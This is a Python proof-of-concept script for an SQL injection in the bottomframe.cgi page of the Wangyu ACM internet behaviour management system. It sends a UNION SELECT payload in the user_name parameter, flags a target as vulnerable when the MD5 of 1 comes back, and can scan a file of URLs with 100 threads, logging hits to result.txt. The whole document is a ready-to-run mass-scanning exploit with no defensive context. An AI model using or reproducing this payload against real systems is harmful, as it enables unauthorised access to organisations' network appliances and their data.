# 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test=""" _______       ,-----.  ,---------. ,---------.    ,-----.    ,---.    ,---. ________ .-------.       ____    ,---.    ,---.    .-''-.                   .-'''-.     ,-----.      .---.      
\  ____  \   .'  .-,  '.\          \\          \ .'  .-,  '.  |    \  /    ||        ||  _ _   \    .'  __ `. |    \  /    |  .'_ _   \                 / _     \  .'  .-,  '.    | ,_|      
| |    \ |  / ,-.|  \ _ \`--.  ,---' `--.  ,---'/ ,-.|  \ _ \ |  ,  \/  ,  ||   .----'| ( ' )  |   /   '  \  \|  ,  \/  ,  | / ( ` )   '               (`' )/`--' / ,-.|  \ _ \ ,-./  )      
| |____/ / ;  \  '_ /  | :  |   \       |   \  ;  \  '_ /  | :|  |\_   /|  ||  _|____ |(_ o _) /   |___|  /  ||  |\_   /|  |. (_ o _)  |  _ _    _ _  (_ o _).   ;  \  '_ /  | :\  '_ '`)    
|   _ _ '. |  _`,/ \ _/  |  :_ _:       :_ _:  |  _`,/ \ _/  ||  _( )_/ |  ||_( )_   || (_,_).' __    _.-`   ||  _( )_/ |  ||  (_,_)___| ( ' )--( ' )  (_,_). '. |  _`,/ \ _/  | > (_)  )    
|  ( ' )  \: (  '\_/ \   ;  (_I_)       (_I_)  : (  '\_/ \   ;| (_ o _) |  |(_ o._)__||  |\ \  |  |.'   _    || (_ o _) |  |'  \   .---.(_{;}_)(_{;}_).---.  \  :: (  '\_/ \   ;(  .  .-'    
| (_{;}_) | \ `"/  \  ) /  (_(=)_)     (_(=)_)  \ `"/  \  ) / |  (_,_)  |  ||(_,_)    |  | \ `'   /|  _( )_  ||  (_,_)  |  | \  `-'    / (_,_)--(_,_) \    `-'  | \ `"/  \  )  \ `-'`-'|___  
|  (_,_)  /  '. \_/``".'    (_I_)       (_I_)    '. \_/``".'  |  |      |  ||   |     |  |  \    / \ (_ o _) /|  |      |  |  \       /                \       /   '. \_/``"/)  ) |        \ 
/_______.'     '-----'      '---'       '---'      '-----'    '--'      '--''---'     ''-'   `'-'   '.(_,_).' '--'      '--'   `'-..-'                  `-...-'      '-----' `-'  `--------` 
                                                                                                                                                                                             

"""

    print(test)

def main():
    banner()
    parser=argparse.ArgumentParser(description='网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload= '/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23'

    try:
        res1=requests.get(url=target+url_payload,timeout=10)
        if 'C4CA4238A0B923820DCC509A6F75849B' in res1.text:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')

if __name__ =='__main__':
    main()
